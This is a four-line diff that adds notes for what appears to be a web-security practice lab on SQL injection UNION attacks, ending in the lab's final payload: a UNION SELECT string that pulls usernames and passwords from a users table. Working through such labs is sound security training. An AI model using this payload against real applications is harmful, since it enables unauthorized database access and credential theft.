@@ -1,0 +1,4 @@
+# Lab 5: SQL injection UNION attack, retrieving data from other tables
+# PRACTITIONER
+
+# FINAL PAYLOAD = ' UNION select username, password FROM users--
